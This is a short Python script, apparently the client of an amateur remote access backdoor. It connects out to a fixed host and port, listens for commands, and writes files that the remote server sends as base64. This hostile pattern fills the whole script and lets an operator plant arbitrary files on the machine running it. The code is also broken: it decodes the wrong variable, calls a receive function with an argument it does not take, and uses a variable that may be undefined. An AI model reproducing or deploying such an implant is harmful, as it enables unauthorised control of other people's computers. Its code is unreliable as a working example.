import socket
from base64 import b64decode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.102", 4001))

#save file
def write_file(file_name, text):
    with open(file_name, "wb") as file:
        file.write(b64decode(file).decode())
        return "[+] Upload Successfull!"
#send data for server
def send_server(deta):
    s.send(deta)

#reciv for server data
def reciv_data():
    return s.recv(1024).decode()

while True:
    rcv = reciv_data()
    rcv = rcv.split()
    if rcv[0]=="uplod":
        rs = write_file(rcv[1], rcv[2])
        
    reciv_data(rs)



    


